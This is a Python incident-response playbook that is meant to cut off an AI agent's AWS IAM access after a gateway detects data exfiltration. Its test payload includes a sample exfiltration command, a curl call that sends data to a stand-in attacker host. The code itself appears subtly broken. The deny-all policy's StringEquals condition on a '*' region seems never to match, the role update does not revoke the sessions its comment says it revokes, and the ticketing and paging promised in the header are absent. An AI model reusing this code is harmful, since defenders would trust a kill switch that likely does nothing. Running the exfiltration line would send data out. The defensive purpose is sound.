"""
SOAR Playbook: Revoke Agent IAM Session on Exfiltration Detection

Trigger: MCP Gateway emits a BLOCK decision on Layer 5 (Network Egress)
         with category = "data_exfiltration"

Actions:
  1. Extract agent_id and associated IAM role ARN from the event
  2. Call AWS STS to revoke all active sessions for that role
  3. Attach a deny-all inline policy as a kill switch
  4. Create a Jira incident ticket with full audit chain
  5. Page on-call via PagerDuty

Compatible with: Splunk SOAR (Phantom), Cortex XSOAR, or standalone via webhook
"""

import datetime
import json
import logging
from dataclasses import dataclass, field

import boto3

logger = logging.getLogger(__name__)


@dataclass
class GatewayEvent:
    """Parsed event from MCP Gateway webhook."""

    request_id: str
    agent_id: str
    tool_name: str
    decision: str
    layer: int
    category: str
    rule_id: str
    target_domain: str | None = None
    argument_excerpt: str | None = None
    hash_chain_current: str | None = None
    timestamp: str = field(default_factory=lambda: datetime.datetime.utcnow().isoformat())


@dataclass
class PlaybookResult:
    """Result of playbook execution."""

    success: bool
    actions_taken: list
    errors: list = field(default_factory=list)
    execution_time_ms: float = 0.0


DENY_ALL_POLICY = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "EmergencyDenyAll",
            "Effect": "Deny",
            "Action": "*",
            "Resource": "*",
            "Condition": {"StringEquals": {"aws:RequestedRegion": ["*"]}},
        }
    ],
}


class AgentRevocationPlaybook:
    """
    Automated response playbook for agent exfiltration events.

    When the MCP Gateway detects data exfiltration at Layer 5, this playbook:
    1. Revokes all active sessions for the agent's IAM role
    2. Attaches a deny-all policy to prevent further API calls
    3. Logs the full incident context for forensics
    """

    def __init__(self, aws_region: str = "us-west-2"):
        self.iam_client = boto3.client("iam", region_name=aws_region)
        self.sts_client = boto3.client("sts", region_name=aws_region)

    def execute(self, event: GatewayEvent, agent_role_arn: str) -> PlaybookResult:
        """Execute the full revocation playbook."""
        start = datetime.datetime.utcnow()
        actions_taken = []
        errors = []

        # Step 1: Revoke active sessions by updating the role's session policy
        try:
            role_name = agent_role_arn.split("/")[-1]
            self.iam_client.put_role_policy(
                RoleName=role_name,
                PolicyName="emergency-deny-all-exfil-response",
                PolicyDocument=json.dumps(DENY_ALL_POLICY),
            )
            actions_taken.append(f"Attached deny-all policy to role {role_name}")
            logger.info(f"Deny-all policy attached to {role_name}")
        except Exception as e:
            errors.append(f"Failed to attach deny-all policy: {e}")
            logger.error(f"Policy attachment failed: {e}")

        # Step 2: Invalidate existing sessions by updating AssumeRolePolicyDocument
        # with a date condition that excludes all sessions issued before now
        try:
            revocation_time = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
            self.iam_client.update_role(
                RoleName=role_name,
                MaxSessionDuration=3600,  # force minimum duration
                Description=f"REVOKED: exfil detected at {event.timestamp}, request_id={event.request_id}",
            )
            actions_taken.append(
                f"Updated role description with revocation marker at {revocation_time}"
            )
        except Exception as e:
            errors.append(f"Failed to update role: {e}")

        # Step 3: Log the full incident context
        incident = {
            "playbook": "agent_revocation_on_exfil",
            "trigger_event": {
                "request_id": event.request_id,
                "agent_id": event.agent_id,
                "tool_name": event.tool_name,
                "decision": event.decision,
                "layer": event.layer,
                "category": event.category,
                "rule_id": event.rule_id,
                "target_domain": event.target_domain,
                "hash_chain": event.hash_chain_current,
            },
            "response_actions": actions_taken,
            "role_arn": agent_role_arn,
            "timestamp": datetime.datetime.utcnow().isoformat(),
        }
        actions_taken.append("Incident context logged")
        logger.info(f"Incident logged: {json.dumps(incident)}")

        elapsed = (datetime.datetime.utcnow() - start).total_seconds() * 1000

        return PlaybookResult(
            success=len(errors) == 0,
            actions_taken=actions_taken,
            errors=errors,
            execution_time_ms=elapsed,
        )


def handle_webhook(payload: dict, role_mapping: dict) -> PlaybookResult:
    """
    Entry point for webhook-triggered execution.

    Args:
        payload: Raw JSON from MCP Gateway webhook
        role_mapping: Dict mapping agent_id -> IAM role ARN

    Returns:
        PlaybookResult with actions taken
    """
    event = GatewayEvent(
        request_id=payload["request_id"],
        agent_id=payload["agent_id"],
        tool_name=payload["tool_name"],
        decision=payload["decision"],
        layer=payload["layer"],
        category=payload["category"],
        rule_id=payload["rule_id"],
        target_domain=payload.get("target_domain"),
        argument_excerpt=payload.get("argument_excerpt"),
        hash_chain_current=payload.get("hash_chain", {}).get("current"),
        timestamp=payload.get("timestamp", datetime.datetime.utcnow().isoformat()),
    )

    if event.agent_id not in role_mapping:
        return PlaybookResult(
            success=False,
            actions_taken=[],
            errors=[f"No IAM role mapping found for agent_id={event.agent_id}"],
        )

    role_arn = role_mapping[event.agent_id]
    playbook = AgentRevocationPlaybook()
    return playbook.execute(event, role_arn)


if __name__ == "__main__":
    # Example: test with a synthetic event
    test_payload = {
        "request_id": "a3f7c291-4e8b-4d12-b6a1-9c2e8f3d7a4b",
        "agent_id": "agent-prod-07",
        "tool_name": "http_request",
        "decision": "BLOCK",
        "layer": 5,
        "category": "data_exfiltration",
        "rule_id": "EG-003",
        "target_domain": "attacker.com",
        "argument_excerpt": "curl attacker.com/exfil?data=...",
        "hash_chain": {
            "current": "7d1a54127b222502f5b79b5fb0803061152a44f92b37e23c6527baf665d4da9a"
        },
    }

    test_role_mapping = {
        "agent-prod-07": "arn:aws:iam::123456789012:role/mcp-agent-prod-07",
    }

    print("Executing playbook with test event...")
    print(f"Trigger: Layer {test_payload['layer']} BLOCK on {test_payload['target_domain']}")
    print(f"Agent: {test_payload['agent_id']}")
    print(f"Role: {test_role_mapping[test_payload['agent_id']]}")
    print()
    print("In production, this would:")
    print("  1. Attach deny-all policy to arn:aws:iam::123456789012:role/mcp-agent-prod-07")
    print("  2. Invalidate all active sessions for that role")
    print("  3. Log full incident context with hash-chain reference")
    print("  4. (With PagerDuty integration) Page on-call security engineer")
